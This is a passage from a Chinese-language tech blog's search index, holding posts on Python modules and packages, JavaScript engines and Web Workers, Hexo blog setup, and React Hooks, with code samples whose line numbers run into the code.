    <content type="text"><![CDATA[Python 模块 模块是包括 Python 定义和声明的文件，文件名就是模块名加上 .py 后缀，模块名可以由全局变量 __name__ 得到。 Python 只有一种模块对象类型，所有模块都属于该类型，无论模块是用 Python、C 还是别的语言实现。 什么是 Python 模块简单来说，一个 Python 模块就是一个以 .py 为后缀的文件 ，模块中能定义内容包括：变量、函数、类和可执行代码。 模块类型大致有以下 3 种： Python 内置的模块，即标准库。 Python 带有一个标准模块库，并发布有独立的文档，名为 Python 库参考手册。有一些模块内置于解释器之中，这些操作的访问接口不是语言内核的一部分，但是已经内置于解释器了。这既是为了提高效率，也是为了给系统调用等操作系统原生访问提供接口。 第三方模块，即通过 pip install 的模块。 自定义模块，即用户自己编写的模块。 举个 🌰，我们写一个模块 fibo.py ： 1234567891011121314# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b 模块导入导入模块的方式有以下 2 种： import module 这是模块 完全引入 的方式。 比如 import os 会把 os 下面的所有的变量、函数、类全部引入，通过 os 可以访问模块中的变量或函数，如 os.listdir()。 当然也可以通过 import module as xx 的方式，为模块起一个别名。 from module import func1, func2 这是模块 部分引入 的方式。按需引入需要模块中定义的函数，另一个好处是可以直接在脚本中使用复制后的变量名。 举个🌰，现在进入 Python 解释器导入该模块： 12&gt;&gt;&gt; import fibo&gt;&gt;&gt; 可以看到当前没有任何输出，因为导入模块的操作，只是进入到模块名 fibo 中，并不会直接进入到定义在 fibo 函数内。可以用模块名访问这些函数: 123456789&gt;&gt;&gt; import fibo&gt;&gt;&gt; fibo.fib(10)0112358 模块执行如果需要让一个 .py 文件既当作脚本又能当作模块用，可以使用 __name__ 这个属性。只有当文件被当作脚本执行的时候， __name__ 的值才会是 &#39;__main__&#39;，而模块导入时不会。 下面，我们改造一下上述 fibo 模块，在末尾添加一段代码： 123456789101112131415161718# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b# 作为脚本来执行模块if __name__ == &apos;__main__&apos; : fib(10) 然后运行 Python 模块： 12345678&gt;&gt;&gt; python fibo.py 0112358 可以看到模块里的代码会被执行，就好像已导入模块一样。 模块加载机制 动态加载模块但是import只能够加载固定名称模块，不能加载动态比如字符串名称模块，比如 str = ‘tools’import str 好了，现在解决了动态加载随意模块的问题了，但是距离成功还有一步之遥，在python里面，加载模块是有缓存的，意思就是说，加载tools.py之后，就算tools.py内容发生改变了，都不会重新加载，还是无法满足我们实时更新加载模块的需求。这里有个比较简单的办法，可以使得模块有需要的时候重新加载，回想之前我们说过，python加载后的模块都会保存在sys.modules里面，我们只需要在重新加载模块之前，把模块从sys.modules里面删除即可。 del sys.modules[‘tools’]import(‘tools’) Python 包 为了帮助组织模块并提供名称层次结构，Python 还引入了包的概念。可以把包看成是文件系统中的目录，并把模块看成是目录中的文件，但请不要对这个类似做过于字面的理解，因为包和模块不是必须来自于文件系统。 与文件系统一样，包通过层次结构进行组织，在包之内除了一般的模块，还可以有子包。 简单地来说，”包“ (package) 是含有 Python 模块的文件夹，不过前提条件是这个文件夹下必须存在 __init__.py 文件。 __init__.py 文件当文件夹下存在 __init__.py 文件时意味着该文件夹是一个包，__init__.py 文件用于组织包，管理各个模块之间的引用、控制包的导入行为。 封装包时确保每个目录都定义了一个 __init__.py 文件，举个🌰： 123456789├── package # 顶层目录├── init.py ├── subPackage1 # 子包 │ ├── init.py │ ├── module1 │ ├── module1 ├── subPackage2 # 子包 │ ├── init.py │ ├── module2 组织好目录结构和代码后，便可以执行以下 import 语句： 123import package.subPackage1.module1from package.subPackage1 import module1import package.subPackage2.module2 as module2 __init__.py 文件的目的是要包含不同运行级别的包的可选的初始化代码，导入一个包时会先导入的它的 __init__.py 文件并自动运行。 举个🌰，执行语句 import package.subPackage1.module1 时，文件 package/__init__.py 将被导入，建立 package 命名空间的内容，且 package/__init__.py 将在文件 package/subPackage1/__init__.py 导入之前导入。 一般情况下 __init__.py 文件可以为空，但是有的时候也可以在 __init__.py 中导入其他的包或模块： 12# package/subPackage1/__init__.pyfrom . import module1 于是就可以通过 import package.subPackage1 代替 import package.subPackage1.module1 来导入模块了。 包导入使用相对路径名导入包中子模块参考文档 【官方文档】— 导入系统 Python _init_.py 作用详解 Python源码剖析笔记3-Python执行原理初探]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js 传送门]]></title>
    <url>%2F2019%2F09%2F01%2FNode.js%2FNode.js%20%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[如何学习 Node.js 【知乎Live】狼叔：如何正确的学习Node.js]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F08%2F21%2FPython%2Fpandas%20%E7%9A%84%20excel%20%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[用 python 做数据分析：pandas 的 excel 应用初探：https://zhuanlan.zhihu.com/p/32338530 Python实现EXCEL常用操作——pandas简介：https://zhuanlan.zhihu.com/p/34541791 XlsxWriter：https://xlsxwriter.readthedocs.io/ python 和 node.js 交互(node.js中执行python函数)：https://blog.csdn.net/qq_23057645/article/details/80967657]]></content>
  </entry>
  <entry>
    <title><![CDATA[js 引擎(一)]]></title>
    <url>%2F2019%2F08%2F18%2FWeb%E5%89%8D%E7%AB%AF%2Fjs%20%E5%BC%95%E6%93%8E%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在 Facebook 发布 Hermes 引擎之前，Fabrice Bellard 以及 C 语言专家 Charlie Gordon 公开发布了 QuickJS。 Facebook发布全新JS引擎！专注提高React Native应用的性能 为了提高 Facebook 应用的性能，我们的团队不断改进自己的 JavaScript 代码和平台。在分析性能数据时，我们发现 JavaScript 引擎本身是影响启动性能和应用包体积的重要因素。有了这些数据，我们意识到必须在比 PC 端限制更多的移动环境中优化 JavaScript 性能。尝试了各种方案后，我们构建了一个新的 JavaScript 引擎：Hermes。它旨在提高应用性能，专注于 React Native 应用，并且在市面上那些内存较少、存储速度较慢且计算能力低下的移动设备上都有良好的表现。 主要特点： 字节码预编译 无 JIT 垃圾回收策略 轻量可嵌入的QuickJS引擎重磅开源，它会是下一个V8吗？ 一路开挂的作者 Fabrice Bellard 是一位法国著名的计算机程序员，因 FFmpeg、QEMU 等项目而闻名业内。他也是最快圆周率算法贝拉公式、TCCBOOT 和 TCC 等项目的作者。 QuickJS 支持 ES2019 规范，包括模块，异步生成器和代理，主要特点： 小巧且易于嵌入：只需几个 C 文件，无外部依赖，x86 下一个简单的 hello world 示例程序仅 190 KB 的大小。 具有极低启动时间的快速解释器：在台式 PC 的单核上，在大约 100 秒内运行 ECMAScript 测试套件56000 次测试。运行时实例的完整生命周期在不到 300 微秒的时间内完成。 支持 ES2019 ，包括模块、异步生成器和完整的 Annex B 支持（传统的 Web 兼容性）。 100％的通过了 ECMAScript 测试用例。 可以将 Javascript 源编译为没有外部依赖的可执行文件。 使用引用计数（以减少内存使用并具有确定性行为）的垃圾收集与循环删除。 数学扩展：BigInt，BigFloat，运算符重载，bigint 模式，数学模式。 在 Javascript 中实现的具有上下文着色的命令行解释器。 带有 C 库包装库构建的内置标准库。 PS: 前端性能优化终于走到了 js 引擎的层面。为了更好地地了解引擎技术，我们先来温故一下 js 基础机制：开发做了这么多年，你真的了解JS工作机制吗？ JIT 将 JS 视为一种解释性语言是不对的。以前很多年 JS 的确是解释性的，但最近出现了一些变化，这种假设也随之过时了。许多流行的 JS 引擎为了使 JS 执行更快，引入了一种称为 Just-In-Time 编译的功能。简而言之，这意味着 JS 代码会在执行期间直接编译成机器码（至少 V8 是这样做的），不再有解释这一步。这个流程耗时稍长，但输出的结果性能更强。为了在有限的时间内完成工作，V8 实际上有两个编译器（不算与 WebAssembly 相关的内容）。其中一个是通用的，能够非常快地编译任何 JS 代码，但只输出性能一般的结果；而另一个编译速度有点慢，是用来编译常用代码的，其输出结果性能极高。当然，因为 JS 有动态类型的特性，这些编译器也不好做。所以类型不变的情况下第二个编译器的效果最好，能让你的代码运行起来快得多。 堆和栈 在 JS 代码的执行过程中会分配两个内存区域——调用栈和 堆。第一个性能非常高，因此用于连续执行所提供的函数。每个函数调用在调用栈中创建一个所谓的“框架”，其中包含其局部变量的副本和 this。你可以通过 Chrome 调试器查看它。就像在其他与堆栈类似的数据结构中一样，调用栈的帧被推送或弹出堆栈，具体取决于正在执行或终止的新函数。你可能见过调用栈上限溢出错误，通常是由于某种形式的无限循环导致的。 谈到堆，就像现实生活中一样，JS 堆是存储本地范围之外对象的地方。它比调用栈慢得多。这就是为什么访问本地变量时速度可能会快很多。堆也是存放未被访问或使用的对象的地方，这种对象就是垃圾。有垃圾就要有垃圾回收器。需要时 JS 运行时的垃圾回收器就会激活，清理堆并释放内存。 前端内存相关探索 堆和栈 在前端中，被存储在栈内的数据包括小数值型，string ，boolean 和复杂类型的地址索引。所谓小数值数据(small number), 即长度短于 32 位存储空间的 number 型数据。一些复杂的数据类型，诸如 Array，Object 等，是被存在堆中的。 共享内存 当程序变的过于复杂时，我们希望通过 webworker 来开启新的独立线程，完成独立计算。 开启新的线程伴随而来的问题就是通讯问题。webworker 的 postMessage 可以帮助我们完成通信，但是这种通信机制是将数据从一部分内存空间复制到主线程的内存下。这个赋值过程就会造成性能的消耗。 而共享内存，顾名思义，可以让我们在不同的线程间，共享一块内存，这些现成都可以对内存进行操作，也可以读取这块内存。省去了赋值数据的过程，不言而喻，整个性能会有较大幅度的提升。 使用原始的 postMessage 方法进行数据传输使用，每一个消息内的数据在不同的线程中，都是被克隆一份以后再传输的。数据量越大，数据传输速度越慢。 sharedBufferArray 的消息传递通过共享内存传递的数据，在 worker 中改变了数据以后，主线程的原始数据也被改变了。 main.js 1234567891011121314151617181920var worker = new Worker(&apos;./sharedArrayBufferWorker.js&apos;);worker.onmessage = function(e)&#123; // 传回到主线程已经被计算过的数据 console.log(&quot;e.data&quot;,&quot; -- &quot;, e.data ); // SharedArrayBuffer(3) &#123;&#125; // 和传统的 postMessage 方式对比，发现主线程的原始数据发生了改变 console.log(&quot;int8Array-outer&quot;,&quot; -- &quot;, int8Array ); // Int8Array(3) [2, 3, 4]&#125;;var sharedArrayBuffer = new SharedArrayBuffer(3);var int8Array = new Int8Array(sharedArrayBuffer);int8Array[0] = 1;int8Array[1] = 2;int8Array[2] = 3;worker.postMessage(sharedArrayBuffer); worker.js 12345678910111213onmessage = function(e)&#123; var arrayData = increaseData(e.data); postMessage(arrayData);&#125;;function increaseData(arrayData)&#123; var int8Array = new Int8Array(arrayData); for(let i = 0; i &lt; int8Array.length; i++)&#123; int8Array[i] += 1; &#125; return arrayData;&#125; 前端 Web Workers 到底是什么？ worker线程的使用有一些注意点 同源限制 worker线程执行的脚本文件必须和主线程的脚本文件同源，这是当然的了，总不能允许worker线程到别人电脑上到处读文件吧 文件限制 为了安全，worker线程无法读取本地文件，它所加载的脚本必须来自网络，且需要与主线程的脚本同源 DOM操作限制 worker线程在与主线程的window不同的另一个全局上下文中运行，其中无法读取主线程所在网页的DOM对象，也不能获取 document、 window等对象，但是可以获取 navigator、 location(只读)、XMLHttpRequest、 setTimeout族等浏览器API。 通信限制 worker线程与主线程不在同一个上下文，不能直接通信，需要通过 postMessage方法来通信。 脚本限制 worker线程不能执行 alert、 confirm，但可以使用 XMLHttpRequest 对象发出ajax请求。 漫谈前端性能 突破 React 应用瓶颈 React 结合 Web worker ? 尝试在 Web worker 中运行 React Virtual DOM 的相关计算，即将 React core 部分移入 Web worker 线程中 ? 还真有人提出类似想法：3092 issue，但是提案被拒绝了，react 选择的是 React Fiber。 但是这个并不妨碍 Web worker 成为 “民间” 的 react 性能解药： React Redux 中间件思想遇见 Web Worker 的灵感（附demo）另外举个例子对比: http://web-perf.github.io/react-worker-dom/]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo & github page 搭建博客]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%85%B6%E4%BB%96%2Fhexo%20%26%20github%20page%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭建搭建过程参考这篇文章：手把手教你使用 Hexo + Github Pages 搭建个人独立博客 Hexo 主题配置建议设置为 next 主题 克隆仓库 12// git clone命令将Next仓库克隆到hexo目录下的themes/nextgit clone https://github.com/theme-next/hexo-theme-next.git themes/next 设置 Next 主题 12345// 在站点根目录下，设置以下代码：# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: hexo-theme-next #此处填入你在themes目录下的next主题文件名 个性化设置大致设置过程参见这篇文章： Hexo 搭建的 GitHub 博客之优化大全 开启文章阅读次数功能 第一种方法：LeanCloud (参考这篇文章：https://www.jianshu.com/p/702a7aec4d00) 去 LeanCloud ，创建新应用，创建 Counter 类 修改主题文件 1234leancloud_visitors: enable: true #将原来的false改为true app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt; 第二种方法： 开启不蒜子统计功能 在主题配置文件中 _config.yml ： 1234567891011121314# Show Views/Visitors of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: enable: true site_uv: true #total visitors site_uv_icon: #user-circle site_uv_header: 你是来访的第 site_uv_footer: 位小伙伴 site_pv: false #total views site_pv_icon: eye site_pv_header: 访问次数： site_pv_footer: 次 post_views: false post_views_icon: eye 不过因为域名过期问题，next 默认集成的 valine 脚本无法访问，解决办法参见：hexo 博客解决不蒜子统计无法显示问题 开启 valine 评论功能大致设置过程参考这篇文章： Hexo 博客使用 valine 评论系统无效果及终极解决方案 需要特别注意的是： valine 评论和文章阅读次数功能均基于 LeanCloud，两者有冲突。如果想同时使用评论和统计功能，解决的办法是：基于 LeanCloud 开启 valine 评论，基于不蒜子开启文章统计功能。 参考文章 手把手教你使用 Hexo + Github Pages 搭建个人独立博客 Hexo 搭建的 GitHub 博客之优化大全 hexo 博客解决不蒜子统计无法显示问题 Hexo 博客使用 valine 评论系统无效果及终极解决方案]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebAssembly 传送门]]></title>
    <url>%2F2019%2F08%2F15%2FWebAssembly%2FWebAssembly%20%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Web端H.265播放器研发解密: https://mp.weixin.qq.com/s/ajLFM8q-4-2hxj-M_ChGdg]]></content>
      <categories>
        <category>WebAssembly</category>
      </categories>
      <tags>
        <tag>WebAssembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React Hooks]]></title>
    <url>%2F2019%2F08%2F15%2FWeb%E5%89%8D%E7%AB%AF%2FReact%20Hooks%2F</url>
    <content type="text"><![CDATA[what Hook 是 React 16.8 的新增特性。它可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。 why react hooks 主要解决以下三个主要的问题： 代码重用：在 hooks 出来之前，常见的代码重用方式是 HOC 和 render props，这两种方式带来的问题是： 你需要解构自己的组件，非常的笨重，同时会带来很深的组件嵌套。 难以重用和共享组件中的与状态相关的逻辑，造成产生很多巨大的组件。 复杂的组件逻辑：在 class 组件中，有许多的 lifecycle 函数，当我们的组件需要处理多个互不相关的 localstate 时，每个生命周期函数中可能会包含着各种互不相关的逻辑在里面，最终导致逻辑复杂的组件难以开发与维护。 class 组件的困惑： 复杂的模式，如渲染道具和高阶组件。 由于业务变动，函数组件不得不改为类组件 具体可以参考官方文档中对 hooks 引入 动机 的解释，另外还可以参考一下知乎上如何评价 React v16.7.0-alpha 提出的 Hooks API？ 这个问题网友的回答。 how useState(0) 返回是个数组形式，useState(0) 代表 count 的初始值是 0，useState 现阶段只能传入一个初始值。useState 类似 setState，你可以看做是异步的，但 useState 必须保证执行顺序一一致，React 为每一次的 useState 调用分配一个空间，通过 useState 调用顺序辨别各个空间。 12345678910const Counter = () =&gt; &#123; const [count, setCount] = useState(0); const increment = () =&gt; setCount(count + 1); return ( &lt;&gt; &lt;h1&gt;&#123;count&#125;&lt;/h1&gt; &lt;button onClick=&#123;increment&#125;&gt;+&lt;/button&gt; &lt;/&gt; )&#125; useEffect 可以把 useEffect 视作 componentDidMount、componentDidUpdate 合体。通过 useEffect 的第二个参数告诉 React 用到了哪些外部变量，来决定是否更新时候执行。可以定义多个 useEffect 函数，会一次进行调用。 123useEffect(() =&gt; &#123; // 每次componentDidMount或者componentDidUpdate都会调用这里&#125;) useEffect 可以传入第二个操作来避免性能的损耗，如果第二个参数数组中的成员变量没有变化则会跳过此次改变。如何传入一个空数组 ，说明每次都不改变，那么该 effect 只会在组件 mount 和 unmount 时期执行。 123useEffect(() =&gt; &#123; // 每次componentDidMount会调用这里&#125;,[]) 如果需要在 componentWillUnmount 需要执行一些事件，可以 return 返回时候进行操作。 123456useEffect(() =&gt; &#123; //只有componentDidMount时候调用这里 return () =&gt; &#123; // 只有componentDidMountUnmount时候调用这里 &#125;;&#125;, []) useEffect 模拟 componentDidpdate，useRef是永远不会改变的一个hooks，每次返回值都是相同的。 12345678const mounted = useRef();useEffect(() =&gt; &#123; if(!mounted.current)&#123; mounted.current = true; &#125; else &#123; // 执行 componentDidpdate &#125;&#125;) useLayoutEffect：如果副作用是跟 DOM 相关的，需要使用 useLayoutEffect，useLayoutEffect 中的副作用会在 DOM 更新之后同步执行。 1234567891011121314function App() &#123; const [width, setWidth] = useState(0); useLayoutEffect(() =&gt; &#123; const title = document.querySelector(&apos;#title&apos;); const titleWidth = title.getBoundingClientRect().width; if (width !== titleWidth) &#123; setWidth(titleWidth); &#125; &#125;); return &lt;div&gt; &lt;h1 id=&quot;title&quot;&gt;hello&lt;/h1&gt; &lt;h2&gt;&#123;width&#125;&lt;/h2&gt; &lt;/div&gt;&#125; useReducer 接收两个参数，一个是 reducer 函数，跟 redux 中的 reducer 是一样的；另外一个是初始的状态值。返回的是一个数组，数组中的第一个元素是状态值，第二个元素是 dispatch 函数。 12345678910111213141516171819202122const reducer = (state, action) =&gt; &#123; switch(action.type) &#123; case &apos;increment&apos;: return &#123;count: state.count + 1&#125;; case &apos;decrement&apos;: return &#123;count: state.count - 1&#125;; case &apos;reset&apos;: return initState; default: return state; &#125;&#125;;function App() &#123; const [state, dispatch] = useReducer(reducer, initState); return &lt;div&gt; &lt;h1&gt;&#123;state.count&#125;&lt;/h1&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;increment&apos;&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;decrement&apos;&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &apos;reset&apos;&#125;)&#125;&gt;reset&lt;/button&gt; &lt;/div&gt;&#125; useRef：在函数组件中获取组件或DOM节点的引用。 12345678function App() &#123; const inputRef = useRef(null); return &lt;div&gt; &lt;input type=&quot;text&quot; ref=&#123;inputRef&#125;/&gt; &lt;button onClick=&#123;() =&gt; inputRef.current.focus()&#125;&gt;focus&lt;/button&gt; &lt;/div&gt;&#125; useContext：Context 的作用就是对它所包含的组件树提供全局共享数据的一种技术。useReducer 结合useContext，通过 context 把 dispatch 函数提供给组件树中的所有组件使用 ，而不用通过 props 添加回调函数的方式一层层传递。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 定义初始化值const initState = &#123; name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, error: &apos;&apos;, isLoggedIn: false,&#125;// 定义state[业务]处理逻辑 reducer函数function loginReducer(state, action) &#123; switch(action.type) &#123; case &apos;login&apos;: return &#123; ...state, isLoading: true, error: &apos;&apos;, &#125; case &apos;success&apos;: return &#123; ...state, isLoggedIn: true, isLoading: false, &#125; case &apos;error&apos;: return &#123; ...state, error: action.payload.error, name: &apos;&apos;, pwd: &apos;&apos;, isLoading: false, &#125; default: return state; &#125;&#125;// 定义 context函数const LoginContext = React.createContext();function LoginPage() &#123; const [state, dispatch] = useReducer(loginReducer, initState); const &#123; name, pwd, isLoading, error, isLoggedIn &#125; = state; const login = (event) =&gt; &#123; event.preventDefault(); dispatch(&#123; type: &apos;login&apos; &#125;); login(&#123; name, pwd &#125;) .then(() =&gt; &#123; dispatch(&#123; type: &apos;success&apos; &#125;); &#125;) .catch((error) =&gt; &#123; dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125;); &#125; // 利用 context 共享dispatch return ( &lt;LoginContext.Provider value=&#123;dispatch&#125;&gt; &lt;...&gt; &lt;LoginButton /&gt; &lt;/LoginContext.Provider&gt; )&#125;function LoginButton() &#123; // 子组件中直接通过context拿到dispatch，出发reducer操作state const dispatch = useContext(LoginContext); const click = () =&gt; &#123; if (error) &#123; // 子组件可以直接 dispatch action dispatch(&#123; type: &apos;error&apos; payload: &#123; error: error.message &#125; &#125;); &#125; &#125;&#125; custom hooks举个🌰，自定义监听窗口大小组件： 12345678// 一个显示目前窗口大小的组件function responsiveComponent()&#123; // custom hooks const width = useWindowWidth(); return ( &lt;p&gt;当前窗口的宽度是 &#123;width&#125;&lt;/p&gt; )&#125; 自定义 hook useWindowWidth， 窗口调整大小时使用副作用来设置状态： 1234567891011121314import &#123; useState, useEffect&#125; from &apos;react&apos;;// custom hooks to listen window width changefunction useWindowWidth()&#123; const [width, setWidth] = useState(window.innerWidth); useEffect(() =&gt; &#123; const handleResize = ()=&gt;&#123; setWidth(window.innerWidth); &#125; window.addEventListener(&apos;resize&apos;, handleResize); &#125;, [width]); // width 没有变化则不处理 return width;&#125; 注： custom hooks 还可以参考一个有意思的 hooks 库 react-use。 限制条件 仅从 React 功能组件调用 hooks，不要从常规 js 函数中调用 hooks。 只能在顶层调用，不能在 for 循环、if 条件判断、 *函数嵌套 *中使用。（Ps：React Hooks: 不是魔法只是数组 一文中有解释为什么 hooks 只能在顶层调用。） 原理与实现 React Hooks: 不是魔法，只是数组 useState 底层实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354let state = [];let setters = [];let firstRun = true;let cursor = 0;function createSetter(cursor) &#123; return function setterWithCursor(newVal) &#123; state[cursor] = newVal; &#125;;&#125;// This is the pseudocode for the useState helperexport function useState(initVal) &#123; if (firstRun) &#123; state.push(initVal); setters.push(createSetter(cursor)); firstRun = false; &#125; const setter = setters[cursor]; const value = state[cursor]; cursor++; return [value, setter];&#125;// Our component code that uses hooksfunction RenderFunctionComponent() &#123; const [firstName, setFirstName] = useState(&quot;Rudi&quot;); // cursor: 0 const [lastName, setLastName] = useState(&quot;Yardley&quot;); // cursor: 1 return ( &lt;div&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Richard&quot;)&#125;&gt;Richard&lt;/Button&gt; &lt;Button onClick=&#123;() =&gt; setFirstName(&quot;Fred&quot;)&#125;&gt;Fred&lt;/Button&gt; &lt;/div&gt; );&#125;// This is sort of simulating Reacts rendering cyclefunction MyComponent() &#123; cursor = 0; // resetting the cursor return &lt;RenderFunctionComponent /&gt;; // render&#125;console.log(state); // Pre-render: []MyComponent();console.log(state); // First-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]MyComponent();console.log(state); // Subsequent-render: [&apos;Rudi&apos;, &apos;Yardley&apos;]// click the &apos;Fred&apos; buttonconsole.log(state); // After-click: [&apos;Fred&apos;, &apos;Yardley&apos;] 参考文章 react hooks的诞生 理解 React Hooks React hooks: 不是魔法只是数组 How to fetch data with React Hooks React Hooks 是不能替代 Redux 的]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 传送门]]></title>
    <url>%2F2019%2F08%2F15%2FPython%2FPython%20%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[基础语法 Python 官网 Python tutorial Python Cookbook Python 从新手到大师 github 资料 数据分析oj 练习平台 pythontip]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
</search>
